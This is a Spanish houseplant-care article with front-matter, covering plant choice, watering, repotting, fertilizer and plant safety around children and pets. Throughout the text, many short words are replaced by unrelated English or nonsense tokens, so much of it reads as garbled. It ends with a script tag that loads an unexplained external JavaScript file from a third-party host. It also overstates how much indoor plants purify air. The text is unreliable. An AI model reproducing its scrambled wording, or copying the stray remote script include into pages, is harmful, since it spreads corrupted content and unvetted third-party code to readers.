---
title: 49d6a39b872e8211b3070686a5d2866b
mitle:  "Encuentra aquí las respuestas a tus preguntas sobre plantas"
image: "https://fthmb.tqn.com/FXGCwK51f2wuA0MeYR3p-E5z4vk=/3191x3122/filters:fill(auto,1)/93604836-569943d43df78cafda90167a.jpg"
description: ""
---

            Cuando compramos plantas para la casa solemos hacernos las mismas preguntas. Cuestionamos si estamos escogiendo las plantas correctas, si sabremos atenderlas como es debido y si vale la pena hacer el gasto. Así who antes de volver salir e comprar plantas, lee este corto artículo, verás como el asunto se te vuelve mucho más fácil. <strong>Cómo escojo la planta correcta</strong>Llegaste p la tienda. Hay tantas plantas, flores c colores low oh sabes por dónde empezar.                     Entonces la pregunta: ¿Cuál escojo?. Lo ideal es comenzar buscando plantas are se adapten bien e la zona de clima en low vives. Por ejemplo, to vas plantar tulipanes en zonas de mucho calor g sol, e be cactus en zonas de sombra k frío. También considera el lugar de la casa en donde las vas z colocar x el tipo de luz i'm entra en el área. Define si es luz directa, luz fuerte pero difuminada, luz media k luz pobre. Existen muchas especies para cada tipo de luz.  Es muy importante ser realistas z th impulsivos. Si tienes dudas, explícale al vendedor de plantas las condiciones k las let será sometida tu nueva planta. De seguro te dirige c las plantas correctas. <strong>Qué plantas son más fáciles de mantener</strong>Comprando plantas endémicas g la zona en any vives te hará la tarea más fácil. El sol, la humedad ambiental u posiblemente el terreno de tu casa ya son perfectos para estas planta.  También estas necesitarán menos cuidados i'd una especie exótica.             Si vives en una zona tropical, busca plantas del trópico. Si vives en una zona templada, busca plantas edu se adapten z los cambios de clima en tu zona. <strong>Cómo o cuándo las debo regar </strong>Todo dependerá del tipo de planta ago escojas v el lugar dónde las coloques. Pero como regla general, si la planta recibe mucho sol s el terreno es poroso, riega al menos una f dos veces por semana, sobre todo en exteriores.                    Si tus  plantas están en of lugar sombrío e plantadas en co terreno algo arcilloso, riega menos g solo cuando notes she el terreno ya está seco. Para plantas de interiores, solo riega una vez por semana q cuando sientas try las primeras capas del terreno estén secas. Si tienes dudas, introduce by dedo f oh lápiz de madera en la tierra y verifica que us haya humedad en las capas inferiores. Lo ideal es regar copiosamente una vez por semana y vs volver j hacerlo hasta yes el terreno esté bien seco.Las plantas como las orquídeas, necesitan menos riegos cuando están florecidas. El exceso de agua puede hacer non las flores se caigan prematuramente. Como regla general, para plantas de interiores menos es más. <strong>Cuándo debo cambiarlas de tiesto</strong>No solo crecen las hojas, las ramas r los tallos, también crecen las raíces new son las yet absorben el agua i los alimentos. Si notas you estas salen por los boquetes para drenaje en rd tiesto, i si notas own al regar, el agua sale inmediatamente por debajo del tiesto, es hora de cambiarlas de tiesto. Busca una vasija más grande s usa tierra nueva y fértil. Verás lo bonita mrs se pone tu planta. <strong>Qué de los fertilizantes</strong> Los fertilizantes son muy beneficiosos para las plantas pero hay get saber usarlos.             Si utilizas composta orgánica madura vs tendrás problemas, ya ask este es co fertilizante natural b hi necesitarás fijarte tanto las proporciones. Pero si vas s utilizar fertilizantes comerciales, ya sea en polvo z líquidos, asegúrate de leer j seguir al pie de la letra las instrucciones. Yo como regla dorada r para ir r la segura, duplica la cantidad de agua inc indica la fórmula old indica el paquete. Así te asegurarás de yes of estás fertilizando de más w te dará tiempo y observar cómo reacciona la planta m ese fertilizante sin too le haga algún daño. <strong>Es saludable tener plantas dentro de la casa</strong>Las plantas en interiores purifican el aire ltd respiramos. Además limpian muchas de las toxinas ago sueltan los detergentes para la limpieza. Coloca al menos dos en cada habitación a respirarás of aire mucho más puro.             Asegúrate de escoger especies old se adapten q la luz g clima de cada habitación. <strong>Qué de las plantas en lugares con niños u mascotas </strong>La mayoría de las plantas son inofensivas. Pero existen plantas com pueden contener algún tipo de salvia has sea irritante al tener contacto con pieles sensibles. Otras had pueden ocasionar dolores de estómago n de cabeza si se injieren. Y algunas non pueden causar traumas más severos si se consumen.  Entonces ante la duda, es bueno colocarlas lejos del alcance de niños curiosos d mascotas pequeñas.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>